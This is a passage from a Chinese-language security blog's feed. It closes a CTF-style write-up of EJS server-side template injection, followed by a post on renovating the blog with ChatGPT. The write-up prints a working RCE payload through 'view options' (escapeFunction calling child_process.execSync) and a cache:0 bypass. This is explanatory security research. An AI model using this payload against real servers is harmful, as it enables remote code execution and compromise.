boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>  <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>  viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>簡單來說，設置 <code>data.settings[&#39;view options&#39;]</code> 就可以蓋掉 <code>opts</code>。</p><p>再來一路往下追會到 <code>handleCache</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleCache</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> template</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> func<span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>  <span class="token keyword">var</span> hasTemplate <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'cache option requires a filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    func <span class="token operator">=</span> exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> func<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// istanbul ignore if: should not happen at all</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Internal EJS error: no file name or template '</span>                    <span class="token operator">+</span> <span class="token string">'provided'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  func <span class="token operator">=</span> exports<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> func<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>options.cache</code> 有設置，那就直接用 cache 裡已經 compile 過的東西，否則就重新 compile 一次。</p><p>而最後重點中的重點就是 <a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L571">compile</a>，裡面有一段如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會拿 <code>escapeFn</code> 去拼接程式碼。</p><p>於是我們只要傳入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">client</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      <span class="token literal-property property">escapeFunction</span><span class="token operator">:</span> <span class="token string">'(() => &#123;&#125;);return process.mainModule.require("child_process").execSync("id").toString()'</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就可以執行任意程式碼，達成 RCE。</p><h2><span id="cache-的問題">Cache 的問題</span></h2><p>雖然前面講的很順，但是有一個 cache 的問題。</p><p>在 production 模式底下 view cache 會<a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L126">自動啟用</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>env <span class="token operator">===</span> <span class="token string">'production'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而這個參數在 render 的時候會自動被帶到 options 裡面：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// set .cache unless explicitly provided</span><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>雖然說我們可以透過 view options 覆蓋原本的 options，但如果原本 options 內就有傳入 cache 的話，又會被覆蓋回去：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果無法覆蓋 cache，那就不能使用上面的方法了，因為 template 不會重新被 compile。</p><p>不過沒關係，幸好這是 JavaScript，注意這行程式碼：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果 <code>renderOptions.cache</code> 是 null 的話才會去設置，而 <code>0 == null</code> 是 false，所以我們可以傳入 <code>cache: 0</code>，就不會進去這一段。</p><p>而 <code>0</code> 是 falsy，所以可以繞過 cache 的檢查，讓 <code>if (options.cache)</code> 是 false。</p><h2><span id="ejs-作者的看法">EJS 作者的看法</span></h2><p>其實 EJS 從以前就有不少相關的 issue 了，清單如下：</p><ul><li><a href="https://github.com/mde/ejs/issues/451">Unrestricted render option may lead to a RCE vulnerability #451</a></li><li><a href="https://github.com/mde/ejs/pull/601">Mitigate prototype pollution effects #601</a></li><li><a href="https://github.com/mde/ejs/issues/663">[Vulnerability] Server side template injection leads to RCE #663</a></li><li><a href="https://github.com/mde/ejs/issues/720">EJS, Server side template injection ejs@3.1.9 Latest #720</a></li><li><a href="https://github.com/mde/ejs/issues/735">EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735</a></li></ul><p>而作者的立場從以前到現在都一樣：</p><blockquote><p>The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary&#x2F;unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: “The patient says, ‘Doctor, it hurts when I do this.’ So the doctor says, ‘Then don’t do that!’” I’m open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland.</p></blockquote><p>主要就是說如果開發者自己要這樣用 library 的話他也沒辦法，這不是 EJS 應該負責的，不該讓 end user 可以傳入整個 object。</p><p>而 EJS 的開發者最近也因為收到很多這類型的 issue report，直接在 README 以及官網上面都加上了告示：</p><blockquote><p>Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: “EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.”</p></blockquote><p>所以這篇文章講的這招無論是現在還是未來都可以用，只要看到有人在 render 時的 object 可控，就意味著可以打到 RCE。</p><p>之後想再寫一篇從開發者角度來看這件事情，雖然說 EJS 作者講的有點道理，但至少 EJS 作為一個 library，應該在文件上特別提醒開發者不該這樣使用，雖然說現在已經有提示，但更針對的是叫 security researcher 不要回報，而不是叫開發者不要這樣用。</p><p>或者，會不會這個其實是一個 bad coding practice，一開始就不該有這樣的 pattern 可以讓別人利用？</p><p>這塊我也還沒想清楚，之後想清楚再來寫吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;原本是想用開發者的角度寫一篇，但最近沒什麼時間，先寫一篇用 CTF 角度來記錄這個問題，以後有時間再補上用開發者角度寫的。&lt;/p&gt;
&lt;p&gt;簡單來說，這篇講的是使用以下 pattern 會造成的問題：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-javascript&quot; data-language=&quot;javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; express &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;express&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; app &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;view engine&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;ejs&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;res&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;index&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;query&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
  console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Example app listening on port &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;$&amp;#123;&lt;/span&gt;port&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>利用 chatGPT 翻新部落格</title>
    <link href="https://blog.huli.tw/2023/06/20/update-blog-with-chatgpt/"/>
    <id>https://blog.huli.tw/2023/06/20/update-blog-with-chatgpt/</id>
    <published>2023-06-20T06:10:44.000Z</published>
    <updated>2023-06-20T06:30:04.029Z</updated>
    
    <content type="html"><![CDATA[<p>我的部落格架構其實很久沒有大幅改動過了，hexo 現在已經出到 v6，v7 正在 beta，而我的部落格還停留在 hexo3。</p><p>最近想說剛好比較有空，就趁機找時間翻新部落格，順便運用了 chatGPT 來當小助手。</p><p>這次做的改動有：</p><ol><li>Hexo 升級版本</li><li>修改 syntax highlight</li><li>深色模式</li><li>自動翻譯（重點）</li></ol><span id="more"></span><h2><span id="hexo-升級版本">Hexo 升級版本</span></h2><p>這次升級比我想像中順利很多，照著網路上找到的教學安裝 <code>npm-upgrade</code>，跑一下之後就升級了，而且升級之後沒什麼東西需要調整。</p><p>真是順利！</p><h2><span id="修改-syntax-highlight">修改 syntax highlight</span></h2><p>原本用的是 highlight.js，但想換很久了，原因是這套不支援 JSX。</p><p>升級版本之後發現 Hexo 內建就有支援另一套 Prism.js，就順便換過去了，只要改一下設定檔跟手動新增 style 就弄好了，其實滿簡單的。</p><p>比較麻煩的是有些 class 跟其他 library 有衝突，就需要再手動調整一下。</p><h2><span id="深色模式">深色模式</span></h2><p><img src="/img/update-blog-with-chatgpt/p1.png" alt="dark mode"></p><p>我的佈景主題用了 <a href="https://bulma.io/">Bulma</a> 這一套 CSS library，而它並不支援深色模式，因此要自己做一個。</p><p>我改的方式也很簡單，就是先找到頁面上每一個字跟背景的顏色，把它換成 CSS variable，最後加上一點簡單的 JavaScript 就完成了。</p><p>CSS 部分像是這樣：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">:root</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #4a4a4a<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #3273dc<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #ff3860<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #ffe4c4<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #888<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">body.dark-mode</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #f8f8f8<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> #061320<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #fafafa<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #27ebda<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #98fff6<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> #324b7e<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #f7f7f7<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> #49495e<span class="token punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> #b4b5b4<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #257800<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #ddd<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> #51ce97<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JavaScript 則是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'true'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>matchMedia <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span><span class="token function">matchMedia</span><span class="token punctuation">(</span><span class="token string">'(prefers-color-scheme: dark)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概花了半天左右的時間邊改邊測，就可以全部弄完。</p><p>另外順便解決了一下 CSS 大小的問題，用這個服務可以幫你把沒有用到的 CSS 清掉：<a href="https://purifycss.online/">https://purifycss.online/</a></p><p>雖然說還是會有些殘留或是誤刪，所以記得用完之後要自己再檢查一遍。</p><h2><span id="自動翻譯">自動翻譯</span></h2><p>重頭戲來了，這個功能大幅依靠 chatGPT 幫我完成。</p><p><img src="/img/update-blog-with-chatgpt/p3.png" alt="translation"></p><p>首先是最重要的翻譯的部分，靠的是 <a href="https://github.com/smikitky/markdown-gpt-translator">markdown-gpt-translator</a> 這個套件，會幫你自動分段然後 call API，再把結果組裝回來。</p><p>還有一點很棒的是 code block 不會上傳，所以省了很多 token，但要注意的是 code block 裡面的 comment 要自己翻譯。</p><p>當初驗證過這一個翻譯的 lib 可以用之後，我就著手進行修改，順便跟我原本想要的自動翻譯功能整合。</p><p>然後，因為 TypeScript 的環境設置有點麻煩，我用了這個工具幫我直接轉成 JavaScript：<a href="https://transform.tools/typescript-to-javascript">https://transform.tools/typescript-to-javascript</a></p><p>自動翻譯要先把以前舊的文章全部翻一遍，流程是：</p><ol><li>列出所有文章的檔案</li><li>查看翻譯後的版本是否存在</li><li>不存在，呼叫翻譯並寫入檔案</li></ol><p>這些功能的框架都直接丟給 chatGPT 幫我寫，我自己再調整一下，補充一下細節即可。</p><p><img src="/img/update-blog-with-chatgpt/p2.png" alt="chatgpt"></p><p>以我自己的文章來說，翻譯一篇需要一分鐘左右，價錢的話大約是 0.02 ~ 0.04 美元。部落格總共 100 多篇文章，翻譯完之後花了不到 3 塊美金，我覺得滿便宜的。</p><p>不過當然還是會有一些需要手動調整的地方，而且還不少，所以還是需要人來做這件事情，我把程式碼跟需要注意的地方都放在這邊了：<a href="https://github.com/aszx87410/huli-blog/tree/master/apps/translator">https://github.com/aszx87410/huli-blog/tree/master/apps/translator</a></p><p>其實原本翻譯完以後，我想說我一篇一篇看過，但發現有點太花時間了，所以就先放著了，等之後有時間再來 review。</p><h2><span id="翻新-open-graph-image">翻新 Open Graph Image</span></h2><p>之前寫了一個產生瀏覽圖的小功能，但是以前很多文章都還沒用到這個功能，這次也靠 chatGPT 幫我寫了一個小程式能夠快速轉換。</p><p>稍微翻修了一下以前的程式碼，順便把以前文章全部掃過一遍，沒產生的就自動產生，然後加上正確的路徑。</p><h2><span id="還沒做好的功能">還沒做好的功能</span></h2><p>最後記一下還沒做好的功能，以後要找比較方便：</p><ol><li>更新 sitemap</li><li>檢查英文文章連結</li><li>檢查英文文章內容</li><li>修改留言系統</li><li>修改多語系 RSS</li><li>自動壓縮圖片</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;我的部落格架構其實很久沒有大幅改動過了，hexo 現在已經出到 v6，v7 正在 beta，而我的部落格還停留在 hexo3。&lt;/p&gt;
&lt;p&gt;最近想說剛好比較有空，就趁機找時間翻新部落格，順便運用了 chatGPT 來當小助手。&lt;/p&gt;
&lt;p&gt;這次做的改動有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Hexo 升級版本&lt;/li&gt;
&lt;li&gt;修改 syntax highlight&lt;/li&gt;
&lt;li&gt;深色模式&lt;/li&gt;
&lt;li&gt;自動翻譯（重點）&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Others" scheme="https://blog.huli.tw/categories/Others/"/>
    
    
    <category term="Others" scheme="https://blog.huli.tw/tags/Others/"/>
    
  </entry>
  
  
  
  <entry>
    <title>正規表達式沒寫好會怎樣？淺談 ReDoS：利用 regexp 的攻擊</title>
    <link href="https://blog.huli.tw/2023/06/12/redos-regular-expression-denial-of-service/"/>
    <id>https://blog.huli.tw/2023/06/12/redos-regular-expression-denial-of-service/</id>
    <published>2023-06-12T06:10:44.000Z</published>
